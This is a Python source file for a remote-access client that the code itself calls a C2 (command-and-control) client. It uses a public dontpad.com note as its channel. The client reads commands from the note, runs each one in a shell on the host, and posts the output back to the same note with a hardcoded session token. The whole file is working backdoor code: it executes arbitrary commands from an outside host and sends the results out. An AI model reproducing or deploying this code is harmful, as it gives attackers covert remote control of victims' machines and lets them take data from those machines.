import requests
import time
import subprocess
from observer import Observer

class Client:
    def __init__(self, url):
        self.url = url
        self.command = ''
        self.result = ''

    def parse_text_dontpad(self, data):
        if "___________________" in data:
            parts = data.split("___________________", 1)
            self.command = parts[0].strip()
            self.result = parts[1].strip()
        else:
            self.command = data.strip()
            self.result = ""

    def execute_command(self, command_body):
        self.parse_text_dontpad(command_body)
        if self.command is None or self.command.lower() == "exit":
            return
        
        self.result = self.execute()
        self.send_result_to_c2()

    def execute(self):
        try:
            processo = subprocess.Popen(
                self.command,
                shell=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True,
                encoding="utf-8",
                errors="ignore"
            )
            stdout, stderr = processo.communicate(timeout=60)
            if stderr:
                return f"Erro na execução do comando: {stderr}"
            return stdout.replace("�", "")
        except Exception as e:
            return f"Erro na execução do comando: {e}"

    def send_result_to_c2(self):
        data = {
            "text": self.command + "\n___________________\n\n" + self.result,
            "lastModified": int(time.time() * 1000),
            "force": "true",
            "session-token": "-25751fc88e6e559870fd"
        }
        response = requests.post("https://api.dontpad.com/yaguinhofodinha", data=data)
        print(f"Send result: [{response.status_code}] - {data}")




if __name__ == "__main__":
    url = "https://api.dontpad.com/yaguinhofodinha.body.json?lastModified=0&session-token=-25751fc88e6e559870fd"
    client = Client(url=url)
    observer = Observer(url=url, client=client)
    observer.start()
